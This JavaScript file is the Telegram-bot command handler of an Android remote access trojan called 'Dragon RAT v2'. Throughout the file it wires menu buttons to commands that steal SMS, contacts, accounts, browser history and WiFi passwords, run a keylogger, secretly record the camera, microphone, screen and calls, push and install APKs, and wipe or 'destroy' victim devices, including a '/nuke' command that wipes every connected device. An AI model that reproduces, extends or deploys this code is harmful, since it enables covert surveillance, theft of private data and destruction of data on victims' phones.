// bot_commands.js — Dragon RAT v2
// Telegram bot command handlers, menus, callbacks, text & document handlers

const bot = global.bot;
const ADMIN_ID = global.ADMIN_ID;

// ── Command Map ──
// Maps button callback data to commands sent to devices
const commandMap = {
    // ── General ──
    'get_devices': { type: 'devices', desc: 'List connected devices' },
    'refresh': { type: 'refresh', desc: 'Refresh device info' },
    
    // ── Device Info ──
    'device_info': { type: 'device_info', desc: 'Get device information' },
    'battery': { type: 'battery', desc: 'Get battery status' },
    'network': { type: 'network', desc: 'Get network info' },
    'location': { type: 'location', desc: 'Get GPS location' },
    'ip_info': { type: 'ip_info', desc: 'Get IP address' },
    'clipboard': { type: 'clipboard', desc: 'Get clipboard content' },
    'installed_apps': { type: 'installed_apps', desc: 'List installed apps' },
    'accounts': { type: 'accounts', desc: 'Get Google accounts' },
    
    // ── SMS ──
    'sms_inbox': { type: 'sms_inbox', desc: 'Get SMS inbox' },
    'sms_sent': { type: 'sms_sent', desc: 'Get sent SMS' },
    'delete_all_sms': { type: 'delete_all_sms', desc: 'Delete all SMS' },
    
    // ── Calls ──
    'call_logs': { type: 'call_logs', desc: 'Get call logs' },
    'call_history': { type: 'call_history', desc: 'Get call history' },
    
    // ── Contacts ──
    'contacts': { type: 'contacts', desc: 'Get contacts list' },
    'contacts_details': { type: 'contacts_details', desc: 'Get contacts with details' },
    
    // ── Camera ──
    'camera_front': { type: 'camera_front', desc: 'Take photo with front camera' },
    'camera_back': { type: 'camera_back', desc: 'Take photo with back camera' },
    'camera_front_video': { type: 'camera_front_video', desc: 'Record video front camera' },
    'camera_back_video': { type: 'camera_back_video', desc: 'Record video back camera' },
    
    // ── Microphone ──
    'mic_record': { type: 'mic_record', desc: 'Record microphone' },
    'mic_listen': { type: 'mic_listen', desc: 'Listen live microphone' },
    
    // ── Screen ──
    'screenshot': { type: 'screenshot', desc: 'Take screenshot' },
    'screen_record': { type: 'screen_record', desc: 'Record screen' },
    'screen_live': { type: 'screen_live', desc: 'Live screen stream' },
    'screen_lock': { type: 'screen_lock', desc: 'Lock screen' },
    'screen_unlock': { type: 'screen_unlock', desc: 'Unlock screen' },
    
    // ── File System ──
    'file_list_root': { type: 'file_list', desc: 'List root files', params: { path: '/' } },
    'file_list_downloads': { type: 'file_list', desc: 'List downloads', params: { path: '/storage/emulated/0/Download' } },
    'file_list_dcim': { type: 'file_list', desc: 'List DCIM', params: { path: '/storage/emulated/0/DCIM' } },
    'file_list_documents': { type: 'file_list', desc: 'List documents', params: { path: '/storage/emulated/0/Documents' } },
    
    // ── Gallery ──
    'gallery_all': { type: 'gallery', desc: 'Get all photos', params: { limit: 50 } },
    'gallery_recent': { type: 'gallery', desc: 'Get recent photos', params: { limit: 10 } },
    
    // ── Keylogger ──
    'keylog_start': { type: 'keylog_start', desc: 'Start keylogger' },
    'keylog_stop': { type: 'keylog_stop', desc: 'Stop keylogger' },
    'keylog_get': { type: 'keylog_get', desc: 'Get keylogger logs' },
    
    // ── WiFi ──
    'wifi_list': { type: 'wifi_list', desc: 'List saved WiFi' },
    'wifi_passwords': { type: 'wifi_passwords', desc: 'Get WiFi passwords' },
    
    // ── Browser ──
    'browser_history': { type: 'browser_history', desc: 'Get browser history' },
    'browser_bookmarks': { type: 'browser_bookmarks', desc: 'Get bookmarks' },
    'search_history': { type: 'search_history', desc: 'Get search history' },
    'open_url': { type: 'open_url', desc: 'Open URL in browser' },
    
    // ── Social Media ──
    'whatsapp_status': { type: 'whatsapp_status', desc: 'Get WhatsApp info' },
    'telegram_status': { type: 'telegram_status', desc: 'Get Telegram info' },
    'instagram_status': { type: 'instagram_status', desc: 'Get Instagram info' },
    'facebook_status': { type: 'facebook_status', desc: 'Get Facebook info' },
    'snapchat_status': { type: 'snapchat_status', desc: 'Get Snapchat info' },
    'tiktok_status': { type: 'tiktok_status', desc: 'Get TikTok info' },
    'discord_status': { type: 'discord_status', desc: 'Get Discord info' },
    'signal_status': { type: 'signal_status', desc: 'Get Signal info' },
    'viber_status': { type: 'viber_status', desc: 'Get Viber info' },
    
    // ── Call Recording ──
    'call_record_start': { type: 'call_record_start', desc: 'Start recording calls' },
    'call_record_stop': { type: 'call_record_stop', desc: 'Stop recording calls' },
    'call_record_list': { type: 'call_record_list', desc: 'List call recordings' },
    
    // ── Notifications ──
    'notifications_get': { type: 'notifications_get', desc: 'Get notifications' },
    'notification_listen': { type: 'notification_listen', desc: 'Listen live notifications' },
    
    // ── Actions ──
    'vibrate': { type: 'vibrate', desc: 'Vibrate device', params: { duration: 5000 } },
    'ring': { type: 'ring', desc: 'Ring device', params: { duration: 10000 } },
    'flashlight_on': { type: 'flashlight_on', desc: 'Turn on flashlight' },
    'flashlight_off': { type: 'flashlight_off', desc: 'Turn off flashlight' },
    'reboot': { type: 'reboot', desc: 'Reboot device' },
    'shutdown': { type: 'shutdown', desc: 'Shutdown device' },
    'lock': { type: 'lock', desc: 'Lock device' },
    'unlock': { type: 'unlock', desc: 'Unlock device' },
    'wipe': { type: 'wipe', desc: 'Wipe device data' },
    'destroy': { type: 'destroy', desc: 'Full device destruction' },
};

// ── Open App Map ──
const openAppMap = {
    'open_whatsapp': 'com.whatsapp',
    'open_telegram': 'org.telegram.messenger',
    'open_instagram': 'com.instagram.android',
    'open_facebook': 'com.facebook.katana',
    'open_snapchat': 'com.snapchat.android',
    'open_tiktok': 'com.zhiliaoapp.musically',
    'open_twitter': 'com.twitter.android',
    'open_discord': 'com.discord',
    'open_signal': 'org.thoughtcrime.securesms',
    'open_viber': 'com.viber.voip',
    'open_chrome': 'com.android.chrome',
    'open_youtube': 'com.google.android.youtube',
    'open_gmail': 'com.google.android.gm',
    'open_maps': 'com.google.android.apps.maps',
    'open_playstore': 'com.android.vending',
    'open_settings': 'com.android.settings',
    'open_camera': 'com.android.camera',
    'open_gallery': 'com.google.android.apps.photos',
    'open_contacts': 'com.android.contacts',
    'open_phone': 'com.android.dialer',
    'open_messages': 'com.android.mms',
    'open_files': 'com.android.documentsui',
    'open_calendar': 'com.google.android.calendar',
    'open_clock': 'com.google.android.deskclock',
    'open_calculator': 'com.android.calculator2',
};

// ── Menu Generators ──

function getMainMenu(device) {
    const isActive = device ? '✅ Active' : '❌ No device';
    const model = device ? `${device.manufacturer || 'Unknown'} ${device.model || ''}` : 'N/A';
    const androidVer = device ? `Android ${device.release || '?'}` : 'N/A';
    const battery = device ? `${device.battery || '?'}%${device.isCharging ? ' ⚡' : ''}` : 'N/A';
    const network = device ? `${device.networkType || '?'}` : 'N/A';
    const root = device ? `${device.rootStatus ? '👑 Yes' : '🔒 No'}` : 'N/A';
    const ip = device ? `${device.ipAddress || '?'}` : 'N/A';

    const text = [
        `🐉 *Dragon RAT v2*`,
        ``,
        `📱 *Model:* ${model}`,
        `🤖 *OS:* ${androidVer}`,
        `🔋 *Battery:* ${battery}`,
        `📶 *Network:* ${network}`,
        `👑 *Root:* ${root}`,
        `🌐 *IP:* ${ip}`,
        ``,
        `*Status:* ${isActive}`,
    ].join('\n');

    return {
        text,
        keyboard: {
            inline_keyboard: [
                [
                    { text: '📱 Device Info', callback_data: 'menu_device' },
                    { text: '📷 Camera', callback_data: 'menu_camera' },
                ],
                [
                    { text: '📁 Files', callback_data: 'menu_files' },
                    { text: '🌐 Network', callback_data: 'menu_network' },
                ],
                [
                    { text: '💬 Messages', callback_data: 'menu_messages' },
                    { text: '📞 Calls', callback_data: 'menu_calls' },
                ],
                [
                    { text: '🛠️ Actions', callback_data: 'menu_actions' },
                    { text: '⚙️ Settings', callback_data: 'menu_settings' },
                ],
                [
                    { text: '📋 Clipboard', callback_data: 'clipboard' },
                    { text: '📍 Location', callback_data: 'location' },
                ],
                [
                    { text: '🔑 Accounts', callback_data: 'accounts' },
                    { text: '📱 Apps', callback_data: 'installed_apps' },
                ],
                [
                    { text: '🔄 Refresh', callback_data: 'refresh' },
                    { text: '📋 List Devices', callback_data: 'get_devices' },
                ],
            ]
        }
    };
}

function getDeviceMenu() {
    return {
        text: '📱 *Device Information*\n\nChoose an option:',
        keyboard: {
            inline_keyboard: [
                [
                    { text: 'ℹ️ Device Info', callback_data: 'device_info' },
                    { text: '🔋 Battery', callback_data: 'battery' },
                ],
                [
                    { text: '🌐 Network', callback_data: 'network' },
                    { text: '📍 Location', callback_data: 'location' },
                ],
                [
                    { text: '🌍 IP Info', callback_data: 'ip_info' },
                    { text: '📋 Clipboard', callback_data: 'clipboard' },
                ],
                [
                    { text: '📱 Installed Apps', callback_data: 'installed_apps' },
                    { text: '🔑 Accounts', callback_data: 'accounts' },
                ],
                [
                    { text: '🔙 Back', callback_data: 'menu_main' },
                ],
            ]
        }
    };
}

function getCameraMenu() {
    return {
        text: '📷 *Camera Controls*\n\nChoose an option:',
        keyboard: {
            inline_keyboard: [
                [
                    { text: '📸 Front Camera', callback_data: 'camera_front' },
                    { text: '📸 Back Camera', callback_data: 'camera_back' },
                ],
                [
                    { text: '🎥 Front Video', callback_data: 'camera_front_video' },
                    { text: '🎥 Back Video', callback_data: 'camera_back_video' },
                ],
                [
                    { text: '📷 Screenshot', callback_data: 'screenshot' },
                    { text: '🎬 Screen Record', callback_data: 'screen_record' },
                ],
                [
                    { text: '🖥️ Live Screen', callback_data: 'screen_live' },
                ],
                [
                    { text: '🎙️ Mic Record', callback_data: 'mic_record' },
                    { text: '🎧 Mic Listen', callback_data: 'mic_listen' },
                ],
                [
                    { text: '🔙 Back', callback_data: 'menu_main' },
                ],
            ]
        }
    };
}

function getFilesMenu() {
    return {
        text: '📁 *File Manager*\n\nChoose a directory:',
        keyboard: {
            inline_keyboard: [
                [
                    { text: '📂 Root /', callback_data: 'file_list_root' },
                    { text: '📂 Downloads', callback_data: 'file_list_downloads' },
                ],
                [
                    { text: '📂 DCIM', callback_data: 'file_list_dcim' },
                    { text: '📂 Documents', callback_data: 'file_list_documents' },
                ],
                [
                    { text: '🖼️ Gallery All', callback_data: 'gallery_all' },
                    { text: '🖼️ Gallery Recent', callback_data: 'gallery_recent' },
                ],
                [
                    { text: '🔙 Back', callback_data: 'menu_main' },
                ],
            ]
        }
    };
}

function getNetworkMenu() {
    return {
        text: '🌐 *Network Options*\n\nChoose an option:',
        keyboard: {
            inline_keyboard: [
                [
                    { text: '📶 WiFi List', callback_data: 'wifi_list' },
                    { text: '🔑 WiFi Passwords', callback_data: 'wifi_passwords' },
                ],
                [
                    { text: '🌍 Network Info', callback_data: 'network' },
                    { text: '🌐 IP Info', callback_data: 'ip_info' },
                ],
                [
                    { text: '🌐 Open URL', callback_data: 'action_open_url' },
                ],
                [
                    { text: '🔙 Back', callback_data: 'menu_main' },
                ],
            ]
        }
    };
}

function getMessagesMenu() {
    return {
        text: '💬 *Messages Options*\n\nChoose an option:',
        keyboard: {
            inline_keyboard: [
                [
                    { text: '📨 SMS Inbox', callback_data: 'sms_inbox' },
                    { text: '📤 SMS Sent', callback_data: 'sms_sent' },
                ],
                [
                    { text: '✉️ Send SMS', callback_data: 'action_send_sms' },
                    { text: '🗑️ Delete All SMS', callback_data: 'delete_all_sms' },
                ],
                [
                    { text: '👥 Contacts', callback_data: 'contacts' },
                    { text: '👥 Contacts Details', callback_data: 'contacts_details' },
                ],
                [
                    { text: '🔙 Back', callback_data: 'menu_main' },
                ],
            ]
        }
    };
}

function getCallsMenu() {
    return {
        text: '📞 *Call Options*\n\nChoose an option:',
        keyboard: {
            inline_keyboard: [
                [
                    { text: '📋 Call Logs', callback_data: 'call_logs' },
                    { text: '📋 Call History', callback_data: 'call_history' },
                ],
                [
                    { text: '⏺️ Record Calls', callback_data: 'call_record_start' },
                    { text: '⏹️ Stop Recording', callback_data: 'call_record_stop' },
                ],
                [
                    { text: '📂 Call Recordings', callback_data: 'call_record_list' },
                ],
                [
                    { text: '🔙 Back', callback_data: 'menu_main' },
                ],
            ]
        }
    };
}

function getActionsMenu() {
    return {
        text: '🛠️ *Device Actions*\n\nChoose an action:',
        keyboard: {
            inline_keyboard: [
                [
                    { text: '📳 Vibrate', callback_data: 'vibrate' },
                    { text: '🔔 Ring', callback_data: 'ring' },
                ],
                [
                    { text: '🔦 Flashlight On', callback_data: 'flashlight_on' },
                    { text: '🔦 Flashlight Off', callback_data: 'flashlight_off' },
                ],
                [
                    { text: '🔒 Lock', callback_data: 'lock' },
                    { text: '🔓 Unlock', callback_data: 'unlock' },
                ],
                [
                    { text: '🔄 Reboot', callback_data: 'reboot' },
                    { text: '⏻ Shutdown', callback_data: 'shutdown' },
                ],
                [
                    { text: '🗑️ Wipe', callback_data: 'wipe' },
                    { text: '💀 Destroy', callback_data: 'destroy' },
                ],
                [
                    { text: '🔑 Browser History', callback_data: 'browser_history' },
                    { text: '🔖 Bookmarks', callback_data: 'browser_bookmarks' },
                ],
                [
                    { text: '🔍 Search History', callback_data: 'search_history' },
                ],
                [
                    { text: '🔙 Back', callback_data: 'menu_main' },
                ],
            ]
        }
    };
}

function getSettingsMenu() {
    return {
        text: '⚙️ *Settings & Social*\n\nChoose an option:',
        keyboard: {
            inline_keyboard: [
                [
                    { text: '⌨️ Start Keylogger', callback_data: 'keylog_start' },
                    { text: '⏹️ Stop Keylogger', callback_data: 'keylog_stop' },
                ],
                [
                    { text: '📝 Get Keylogs', callback_data: 'keylog_get' },
                ],
                [
                    { text: '🔔 Get Notifications', callback_data: 'notifications_get' },
                    { text: '👂 Listen Notifications', callback_data: 'notification_listen' },
                ],
                [
                    { text: '🔙 Back', callback_data: 'menu_main' },
                ],
            ]
        }
    };
}

// ── Menu Map ──
const menuMap = {
    'menu_main': getMainMenu,
    'menu_device': getDeviceMenu,
    'menu_camera': getCameraMenu,
    'menu_files': getFilesMenu,
    'menu_network': getNetworkMenu,
    'menu_messages': getMessagesMenu,
    'menu_calls': getCallsMenu,
    'menu_actions': getActionsMenu,
    'menu_settings': getSettingsMenu,
};

// ── Helpers ──

function getActiveDevice() {
    if (!global.activeDevice) return null;
    const device = global.devices.get(global.activeDevice);
    return device ? device.info : null;
}

function formatDeviceList() {
    const list = [];
    let idx = 0;
    for (const [socketId, device] of global.devices) {
        idx++;
        const info = device.info;
        const isActive = global.activeDevice === socketId;
        const marker = isActive ? '⭐ ' : '';
        const root = info?.rootStatus ? '👑' : '🔒';
        const net = info?.networkType?.includes('WiFi') ? '📶' : '📡';
        const timeAgo = info?.lastSeen ? Math.floor((Date.now() - info.lastSeen) / 1000) : '?';
        
        list.push(
            `${marker}${idx}. ${root}${net} ${info?.manufacturer || 'Unknown'} ${info?.model || ''}` +
            `\n   🆔 ${info?.id || socketId.substring(0, 8)}` +
            `\n   🤖 Android ${info?.release || '?'} 🔋 ${info?.battery || '?'}%` +
            `\n   🌐 ${info?.ipAddress || '?'} (${timeAgo}s ago)` +
            (isActive ? ' ◀ ACTIVE' : '')
        );
    }
    return list.length > 0 ? list.join('\n') : '❌ No devices connected';
}

// ── Simple Actions ──
const simpleActions = {
    'vibrate': '📳 Vibrating device...',
    'ring': '🔔 Ringing device...',
    'reboot': '🔄 Rebooting device...',
    'shutdown': '⏻ Shutting down device...',
    'lock': '🔒 Locking device...',
    'unlock': '🔓 Unlocking device...',
    'wipe': '🗑️ Wiping device data...',
    'destroy': '💀 Destroying device...',
    'flashlight_on': '🔦 Flashlight ON',
    'flashlight_off': '🔦 Flashlight OFF',
    'camera_front': '📸 Capturing with front camera...',
    'camera_back': '📸 Capturing with back camera...',
    'screenshot': '📷 Taking screenshot...',
    'screen_record': '🎬 Recording screen...',
    'screen_live': '🖥️ Starting live screen...',
    'mic_record': '🎙️ Recording microphone...',
    'mic_listen': '🎧 Listening to microphone...',
    'device_info': 'ℹ️ Fetching device info...',
    'battery': '🔋 Fetching battery status...',
    'network': '🌐 Fetching network info...',
    'location': '📍 Fetching location...',
    'ip_info': '🌍 Fetching IP info...',
    'clipboard': '📋 Fetching clipboard...',
    'installed_apps': '📱 Fetching installed apps...',
    'accounts': '🔑 Fetching accounts...',
    'sms_inbox': '📨 Fetching SMS inbox...',
    'sms_sent': '📤 Fetching sent SMS...',
    'delete_all_sms': '🗑️ Deleting all SMS...',
    'call_logs': '📞 Fetching call logs...',
    'call_history': '📞 Fetching call history...',
    'contacts': '👥 Fetching contacts...',
    'contacts_details': '👥 Fetching detailed contacts...',
    'wifi_list': '📶 Scanning WiFi networks...',
    'wifi_passwords': '🔑 Extracting WiFi passwords...',
    'browser_history': '🌐 Fetching browser history...',
    'browser_bookmarks': '🔖 Fetching bookmarks...',
    'search_history': '🔍 Fetching search history...',
    'keylog_start': '⌨️ Starting keylogger...',
    'keylog_stop': '⏹️ Stopping keylogger...',
    'keylog_get': '📝 Fetching keylogs...',
    'notifications_get': '🔔 Fetching notifications...',
    'notification_listen': '👂 Listening to notifications...',
    'gallery_all': '🖼️ Fetching all photos...',
    'gallery_recent': '🖼️ Fetching recent photos...',
    'file_list_root': '📂 Listing root files...',
    'file_list_downloads': '📂 Listing downloads...',
    'file_list_dcim': '📂 Listing DCIM...',
    'file_list_documents': '📂 Listing documents...',
    'refresh': '🔄 Refreshing device...',
    'get_devices': '📋 Fetching device list...',
    'call_record_start': '⏺️ Starting call recording...',
    'call_record_stop': '⏹️ Stopping call recording...',
    'call_record_list': '📂 Fetching call recordings...',
    'whatsapp_status': '💬 Fetching WhatsApp status...',
    'telegram_status': '💬 Fetching Telegram status...',
    'instagram_status': '💬 Fetching Instagram status...',
    'facebook_status': '💬 Fetching Facebook status...',
    'snapchat_status': '💬 Fetching Snapchat status...',
    'tiktok_status': '💬 Fetching TikTok status...',
    'discord_status': '💬 Fetching Discord status...',
    'signal_status': '💬 Fetching Signal status...',
    'viber_status': '💬 Fetching Viber status...',
    'camera_front_video': '🎥 Recording video front camera...',
    'camera_back_video': '🎥 Recording video back camera...',
    'screen_lock': '🔒 Locking screen...',
    'screen_unlock': '🔓 Unlocking screen...',
};

// ── Handler: Simple Actions ──

function handleSimpleAction(action, chatId, msgId) {
    const actionData = commandMap[action];
    if (!actionData) return false;

    const device = getActiveDevice();
    if (!device) {
        bot.sendMessage(chatId, '❌ No active device connected. Select a device first.');
        return true;
    }

    const responseText = simpleActions[action] || `⏳ Executing ${action}...`;
    bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });

    global.sendCommand(global.activeDevice, {
        type: actionData.type,
        ...(actionData.params || {})
    });

    return true;
}

// ── Handler: Interactive Actions ──

function handleInteractiveAction(action, chatId) {
    const device = getActiveDevice();
    if (!device) {
        bot.sendMessage(chatId, '❌ No active device connected. Select a device first.');
        return true;
    }

    switch (action) {
        case 'action_send_sms':
            global.waitingForInput.set(chatId, { step: 'sms_number' });
            bot.sendMessage(chatId, 
                '📱 *Send SMS*\n\nEnter the phone number (with country code):\nExample: +1234567890',
                { parse_mode: 'Markdown' }
            );
            return true;

        case 'action_open_url':
            global.waitingForInput.set(chatId, { step: 'url' });
            bot.sendMessage(chatId,
                '🌐 *Open URL*\n\nEnter the URL to open on the device:\nExample: https://google.com',
                { parse_mode: 'Markdown' }
            );
            return true;

        default:
            return false;
    }
}

// ── Setup: Callback Query Handler ──

function setupCallbackHandler() {
    bot.on('callback_query', (query) => {
        const data = query.data;
        const chatId = query.message.chat.id;
        const msgId = query.message.message_id;

        // Answer callback to remove loading state
        bot.answerCallbackQuery(query.id).catch(() => {});

        // ── Menu Navigation ──
        if (menuMap[data]) {
            const device = getActiveDevice();
            const menu = data === 'menu_main' ? getMainMenu(device) : menuMap[data]();
            bot.editMessageText(menu.text, {
                chat_id: chatId,
                message_id: msgId,
                parse_mode: 'Markdown',
                reply_markup: menu.keyboard,
            }).catch(() => {});
            return;
        }

        // ── Open App ──
        if (openAppMap[data]) {
            const pkg = openAppMap[data];
            const device = getActiveDevice();
            if (!device) {
                bot.sendMessage(chatId, '❌ No active device connected.');
                return;
            }
            bot.sendMessage(chatId, `📱 Opening ${data.replace('open_', '')}...`);
            global.sendCommand(global.activeDevice, { type: 'open_app', package: pkg });
            return;
        }

        // ── Interactive Actions ──
        if (handleInteractiveAction(data, chatId)) return;

        // ── Simple Actions ──
        if (handleSimpleAction(data, chatId, msgId)) return;
    });
}

// ── Setup: Text Message Handler ──

function setupTextHandler() {
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;

        // Ignore commands (they're handled by setupCommandHandler)
        if (text && text.startsWith('/')) return;

        // Check if waiting for input
        if (global.waitingForInput.has(chatId)) {
            const state = global.waitingForInput.get(chatId);
            
            if (state.step === 'sms_number') {
                const number = text.trim();
                global.waitingForInput.set(chatId, { step: 'sms_text', number });
                bot.sendMessage(chatId,
                    `📱 Number: \`${number}\`\n\nNow enter the SMS message text:`,
                    { parse_mode: 'Markdown' }
                );
                return;
            }

            if (state.step === 'sms_text') {
                const number = state.number;
                const message = text;
                global.waitingForInput.delete(chatId);

                const device = getActiveDevice();
                if (!device) {
                    bot.sendMessage(chatId, '❌ No active device connected.');
                    return;
                }

                bot.sendMessage(chatId, `📨 Sending SMS to ${number}...`);
                global.sendCommand(global.activeDevice, {
                    type: 'send_sms',
                    number: number,
                    message: message,
                });
                return;
            }

            if (state.step === 'url') {
                const url = text.trim();
                global.waitingForInput.delete(chatId);

                const device = getActiveDevice();
                if (!device) {
                    bot.sendMessage(chatId, '❌ No active device connected.');
                    return;
                }

                bot.sendMessage(chatId, `🌐 Opening URL: ${url}`);
                global.sendCommand(global.activeDevice, {
                    type: 'open_url',
                    url: url,
                });
                return;
            }
        }
    });
}

// ── Setup: Document Handler ──

function setupDocumentHandler() {
    bot.on('document', (msg) => {
        const chatId = msg.chat.id;
        if (chatId !== ADMIN_ID) return;

        const doc = msg.document;
        const fileName = doc.file_name || 'unknown';
        const fileId = doc.file_id;

        bot.sendMessage(chatId, `📄 Received file: \`${fileName}\`\n\nProcessing...`, { parse_mode: 'Markdown' });

        // Determine action based on file extension
        const ext = fileName.split('.').pop().toLowerCase();

        if (ext === 'apk') {
            // Send APK to device for installation
            bot.getFileLink(fileId).then((link) => {
                const device = getActiveDevice();
                if (!device) {
                    bot.sendMessage(chatId, '❌ No active device connected.');
                    return;
                }
                bot.sendMessage(chatId, `📦 Sending APK to device for installation...`);
                global.sendCommand(global.activeDevice, {
                    type: 'install_apk',
                    url: link,
                    filename: fileName,
                });
            }).catch((err) => {
                bot.sendMessage(chatId, `❌ Failed to get file: ${err.message}`);
            });
        } else {
            // Upload file to device storage
            bot.getFileLink(fileId).then((link) => {
                const device = getActiveDevice();
                if (!device) {
                    bot.sendMessage(chatId, '❌ No active device connected.');
                    return;
                }
                bot.sendMessage(chatId, `📤 Uploading ${fileName} to device...`);
                global.sendCommand(global.activeDevice, {
                    type: 'upload_file',
                    url: link,
                    filename: fileName,
                });
            }).catch((err) => {
                bot.sendMessage(chatId, `❌ Failed to get file: ${err.message}`);
            });
        }
    });
}

// ── Setup: Command Handler ──

function setupCommandHandler() {
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId !== ADMIN_ID) {
            bot.sendMessage(chatId, '❌ Unauthorized. This bot is for authorized personnel only.');
            return;
        }

        const device = getActiveDevice();
        const menu = getMainMenu(device);
        bot.sendMessage(chatId, menu.text, {
            parse_mode: 'Markdown',
            reply_markup: menu.keyboard,
        });
    });

    bot.onText(/\/devices/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId !== ADMIN_ID) return;

        const list = formatDeviceList();
        const activeId = global.activeDevice ? 
            (global.devices.get(global.activeDevice)?.info?.id || global.activeDevice) : 'None';
        
        bot.sendMessage(chatId,
            `📋 *Connected Devices*\n\n${list}\n\n⭐ *Active:* \`${activeId}\``,
            { parse_mode: 'Markdown' }
        );
    });

    bot.onText(/\/select (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId !== ADMIN_ID) return;

        const identifier = match[1].toLowerCase();
        let found = null;

        for (const [socketId, device] of global.devices) {
            const info = device.info;
            if (!info) continue;
            if (info.id?.toLowerCase().includes(identifier) ||
                info.model?.toLowerCase().includes(identifier) ||
                socketId.includes(identifier)) {
                found = socketId;
                break;
            }
        }

        if (found) {
            global.activeDevice = found;
            const info = global.devices.get(found).info;
            bot.sendMessage(chatId,
                `✅ *Active device changed*\n\n📱 ${info.manufacturer} ${info.model}\n🆔 \`${info.id}\``,
                { parse_mode: 'Markdown' }
            );
        } else {
            bot.sendMessage(chatId, `❌ No device found matching "${identifier}"`);
        }
    });

    bot.onText(/\/help/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId !== ADMIN_ID) return;

        bot.sendMessage(chatId,
            `🐉 *Dragon RAT v2 Commands*\n\n` +
            `/start - Show main menu\n` +
            `/devices - List all connected devices\n` +
            `/select <id> - Select a device by ID, model, or socket\n` +
            `/nuke - Destroy ALL connected devices (requires confirmation)\n` +
            `/help - Show this help message\n\n` +
            `*Interactive:*\n` +
            `Send a file/APK to upload or install on active device\n` +
            `Use the inline buttons to execute commands`,
            { parse_mode: 'Markdown' }
        );
    });

    bot.onText(/\/nuke/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId !== ADMIN_ID) return;

        global.waitingForInput.set(chatId, { step: 'nuke_confirm' });
        bot.sendMessage(chatId,
            `💀 *DESTROY ALL DEVICES?*\n\n` +
            `This will send the destroy command to ALL ${global.devices.size} connected devices.\n` +
            `This action CANNOT be undone.\n\n` +
            `Type \`DRAGON_NUKE\` to confirm.`,
            { parse_mode: 'Markdown' }
        );
    });
}

// ── Main Setup Function ──

function setupBotCommands() {
    setupCallbackHandler();
    setupTextHandler();
    setupDocumentHandler();
    setupCommandHandler();

    // Handle nuke text confirmation
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text || '';
        
        if (chatId !== ADMIN_ID) return;
        if (!global.waitingForInput.has(chatId)) return;

        const state = global.waitingForInput.get(chatId);
        
        if (state.step === 'nuke_confirm' && text === 'DRAGON_NUKE') {
            global.waitingForInput.delete(chatId);
            const count = global.broadcastCommand({ type: 'destroy', action: 'full_wipe' });
            
            // Clear all devices
            global.devices.clear();
            global.activeDevice = null;

            bot.sendMessage(chatId,
                `💀 *NUKE COMPLETE*\n\n` +
                `Destroy command sent to ${count} device(s).\n` +
                `All device data has been wiped.\n` +
                `All connections terminated.`,
                { parse_mode: 'Markdown' }
            );
            return;
        }

        if (state.step === 'nuke_confirm' && text !== 'DRAGON_NUKE') {
            global.waitingForInput.delete(chatId);
            bot.sendMessage(chatId, '❌ Nuke cancelled — incorrect confirmation text.');
        }
    });

    console.log('[+] Bot commands initialized');
}

// ── Exports ──

module.exports = {
    setupBotCommands,
    getMainMenu,
    getActiveDevice,
    formatDeviceList,
    commandMap,
    openAppMap,
    menuMap,
};
